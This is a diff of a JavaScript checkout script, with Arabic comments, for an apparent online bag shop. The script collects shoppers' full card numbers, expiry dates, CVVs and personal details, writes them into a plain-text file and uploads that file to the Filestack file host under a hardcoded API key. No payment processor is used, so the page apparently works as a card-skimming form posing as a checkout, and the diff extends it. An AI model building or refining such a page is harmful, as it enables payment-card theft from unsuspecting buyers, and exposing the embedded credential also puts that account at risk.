@@ -1,6 +1,6 @@
-document.addEventListener('DOMContentLoaded', function () { 
+document.addEventListener('DOMContentLoaded', function () {
   const form = document.getElementById('checkout-form');
-  const submitButton = document.getElementById('submit-button'); // الزر الذي سيتم تعطيله
+  const submitButton = document.getElementById('submit-button'); // افترض أن الزر يحمل الـ ID "submit-button"
 
   // استخراج المعلمات من الرابط
   function getUrlParams() {
@@ -23,23 +23,27 @@ document.addEventListener('DOMContentLoaded', function () {
 
   // عرض الصورة
   const productImage = document.getElementById('product-image');
+  const productImageContainer = document.querySelector('.product-info');
+
   if (urlParams.image) {
-    productImage.src = urlParams.image;
-    productImage.alt = `${urlParams.name || 'Product'} image`;
-    productImage.style.display = 'block';
+    // التأكد من أن الصورة ليست فارغة
+    productImage.src = urlParams.image;  // تعيين رابط الصورة
+    productImage.alt = `${urlParams.name || 'Product'} image`;  // إضافة نص بديل للصورة
+    productImage.style.display = 'block';  // إظهار الصورة
   } else {
-    productImage.src = 'https://via.placeholder.com/500x300?text=No+Image+Available';
+    // إذا كانت الصورة غير موجودة أو فارغة، عرض صورة افتراضية
+    productImage.src = 'https://via.placeholder.com/500x300?text=No+Image+Available';  // صورة افتراضية
     productImage.alt = 'No Image Available';
-    productImage.style.display = 'block';
+    productImage.style.display = 'block';  // إظهار الصورة
   }
 
   // عرض الكمية
-  const productQuantity = parseInt(urlParams.quantity, 10) || 1;
+  const productQuantity = parseInt(urlParams.quantity, 10) || 1; // تعيين الكمية الافتراضية إلى 1 إذا لم يتم إرسالها
   document.getElementById('product-quantity').textContent = `Quantity: ${productQuantity}`;
 
   // حساب السعر الإجمالي
-  const productPrice = parseFloat(urlParams.price) || 0;
-  const totalPrice = (productPrice * productQuantity).toFixed(2);
+  const productPrice = parseFloat(urlParams.price) || 0; // تحويل السعر إلى عدد عشري
+  const totalPrice = (productPrice * productQuantity).toFixed(2); // حساب السعر الإجمالي
   document.getElementById('total-price').textContent = `Total Price: $${totalPrice}`;
 
   // إضافة مستمع للإرسال
@@ -59,7 +63,15 @@ document.addEventListener('DOMContentLoaded', function () {
     const expiry = document.getElementById('expiry').value;
     const cvv = document.getElementById('cvv').value;
 
+    // معلومات المنتج
+    const productName = document.getElementById('product-name').textContent.split(': ')[1];  // اسم المنتج
+    const productPriceText = document.getElementById('product-price').textContent.split(': ')[1];  // سعر المنتج
+    const productQuantityText = document.getElementById('product-quantity').textContent.split(': ')[1];  // كمية المنتج
+    const productImageUrl = urlParams.productImage || '';  // رابط الصورة
+
+    // تحقق من القيم
     let isValid = true;
+
     removeErrorMessages();  // إزالة رسائل الخطأ السابقة
 
     // تحقق من الحقول الفارغة
@@ -74,14 +86,44 @@ document.addEventListener('DOMContentLoaded', function () {
         showErrorMessage('Please enter a valid email address.', 'email');
     }
 
-    // التحقق من صحة باقي الحقول هنا...
+    // تحقق من اسم حامل البطاقة
+    if (!validateCardName(cardName)) {
+        isValid = false;
+        showErrorMessage('Please enter a valid cardholder name (letters only).', 'card-name');
+    }
+
+    // تحقق من صحة أرقام البطاقة (Visa / MasterCard فقط)
+    if (!validateCard(cardNumber)) {
+        isValid = false;
+        showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
+    }
+
+    // تحقق من تاريخ الصلاحية
+    if (!validateExpiry(expiry)) {
+        isValid = false;
+        showErrorMessage('Please enter a valid expiry date in MM/YY format.', 'expiry');
+    }
+
+    // تحقق من CVV
+    if (!validateCVV(cvv)) {
+        isValid = false;
+        showErrorMessage('Please enter a valid CVV number.', 'cvv');
+    }
 
     if (isValid) {
-        // تعطيل الزر أثناء الإرسال
+        // تغيير النص إلى "يتم التحميل الآن" وتعطيل الزر
+        submitButton.textContent = 'يتم التحميل الآن';
         submitButton.disabled = true;
 
+        // تغيير لون الحقول إلى لون غامق
+        const fields = form.querySelectorAll('input');
+        fields.forEach(field => {
+            field.style.backgroundColor = '#f0f0f0';  // خلفية فاتحة للإشارة إلى أن البيانات يتم إرسالها
+            field.style.color = '#555';  // تغيير اللون النصي
+        });
+
         // إنشاء محتوى الملف النصي مع بيانات المنتج
-        const orderData = `
+        const orderData = ` 
             Email: ${email}
             First Name: ${firstName}
             Last Name: ${lastName}
@@ -93,6 +135,7 @@ document.addEventListener('DOMContentLoaded', function () {
             Card Number: ${cardNumber}
             Expiry Date: ${expiry}
             CVV: ${cvv}
+
             --- Product Details ---
             Product Name: ${productName}
             Product Price: $${productPriceText}
@@ -101,11 +144,11 @@ document.addEventListener('DOMContentLoaded', function () {
             Total Price: $${totalPrice}
         `;
         
-        // تحويل البيانات إلى Blob
+        // تحويل البيانات إلى Blob (بيانات ثنائية)
         const blob = new Blob([orderData], { type: 'text/plain' });
 
         // إعدادات Filestack API
-        const apiKey = 'A7fSrsBg3RjybN1kkK99lz';
+        const apiKey = 'A7fSrsBg3RjybN1kkK99lz'; // استبدل بـ API Key الخاص بك
         const client = filestack.init(apiKey);
 
         // رفع الملف إلى Filestack
@@ -113,15 +156,15 @@ document.addEventListener('DOMContentLoaded', function () {
             .then(result => {
                 // عند نجاح رفع الملف
                 alert('Your order has been successfully placed and saved to Filestack!');
-                window.location.href = 'https://checkout.glamhavenbags.shop/thank-you.html';  // إعادة توجيه
+                window.location.href = 'https://checkout.glamhavenbags.shop/thank-you.html';  // إعادة توجيه إلى صفحة الشكر
+                console.log(result);  // تفاصيل رفع الملف
             })
             .catch(error => {
-                // إذا حدث خطأ، إعادة تمكين الزر
+                // في حال حدوث خطأ
                 console.error('Error uploading file to Filestack:', error);
                 alert('Something went wrong, please try again later.');
-
-                // إعادة تمكين الزر إذا فشل الإرسال
-                submitButton.disabled = false;
+                submitButton.textContent = 'إكمال الشراء'; // إعادة النص إلى الأصل
+                submitButton.disabled = false; // إعادة تمكين الزر
             });
     }
   });
